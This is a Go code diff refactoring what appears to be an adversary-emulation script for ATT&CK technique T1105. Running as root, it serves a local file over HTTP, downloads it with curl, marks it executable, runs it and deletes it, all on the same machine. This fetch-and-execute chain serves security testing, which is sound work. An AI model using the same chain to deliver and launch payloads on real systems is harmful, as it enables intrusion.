@@ -11,40 +11,42 @@ import (
 )
 
 var (
-	ip           = system.GetOutboundIP()
-	port         = "54340"
-	execFileName = "myapp"
+	port     = "54340"
+	fileName = "myapp"
 )
 
 func main() {
+	filePath := filepath.Join("assets", fileName)
+	ip := system.GetOutboundIP()
+	url := fmt.Sprintf("http://%s:%s/payload", ip, port)
+
 	if !system.IsRoot() {
 		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
 		return
 	}
 	fmt.Printf("%sT1105 Ingress Tool Transfer\n", tags.Info)
 	go func() {
-		err := webServer(port, execFileName)
+		err := webServer(port, filePath)
 		if err != nil {
 			fmt.Printf("%s%s\n", tags.Err, err.Error())
 		}
 	}()
-	err := getRequest(fmt.Sprintf("http://%s:%s/payload", ip, port), execFileName)
+
+	err := getRequestToRetrieveFile(url, fileName)
 	if err != nil {
 		fmt.Printf("%s%s\n", tags.Err, err.Error())
 		return
 	}
-	err = os.Remove(execFileName)
-	if err != nil {
-		fmt.Printf("%s%s\n", tags.Err, err.Error())
-		return
-	}
-	fmt.Printf("%sFile %s deleted\n", tags.Info, execFileName)
+
+	makeFileExecutable(fileName)
+
+	launchFile(fileName)
+
+	deleteFile(fileName)
 }
 
-func webServer(port string, execFileName string) error {
+func webServer(port string, filePath string) error {
 	http.HandleFunc("/payload", func(w http.ResponseWriter, r *http.Request) {
-		filePath := filepath.Join("assets", execFileName)
-
 		file, err := os.Open(filePath)
 		if err != nil {
 			http.Error(w, "File not found\n", http.StatusNotFound)
@@ -64,22 +66,41 @@ func webServer(port string, execFileName string) error {
 	if err != nil {
 		return err
 	}
+
 	return nil
 }
 
-func getRequest(url string, execFileName string) error {
-	cmd := exec.Command("curl", "-X", "GET", url, "-o", execFileName)
-	err := cmd.Run()
+func getRequestToRetrieveFile(url string, fileName string) error {
+	err := exec.Command("curl", "-X", "GET", url, "-o", fileName).Run()
 	if err != nil {
 		return err
 	}
-	exec.Command("chmod", "+x", execFileName).Run()
-	cmd = exec.Command("./" + execFileName)
-	out, err := cmd.Output()
+
+	return nil
+}
+
+func makeFileExecutable(filePath string) {
+	err := exec.Command("chmod", "+x", filePath).Run()
+	if err != nil {
+		fmt.Printf("%sError when changing access rights for %s: %s\n", tags.Log, filePath, err.Error())
+	}
+}
+
+func launchFile(filePath string) error {
+	out, err := exec.Command("./" + filePath).Output()
 	if err != nil {
 		return err
 	}
-	fmt.Printf("%sThe %s file is running\n", tags.Log, execFileName)
+	fmt.Printf("%sThe %s file is running\n", tags.Log, fileName)
 	fmt.Print(string(out))
 	return nil
+}
+
+func deleteFile(filePath string) {
+	err := os.Remove(fileName)
+	if err != nil {
+		fmt.Printf("%sError when deleting file %s: %s\n", tags.Err, filePath, err.Error())
+	} else {
+		fmt.Printf("%sFile %s deleted\n", tags.Info, fileName)
+	}
 }
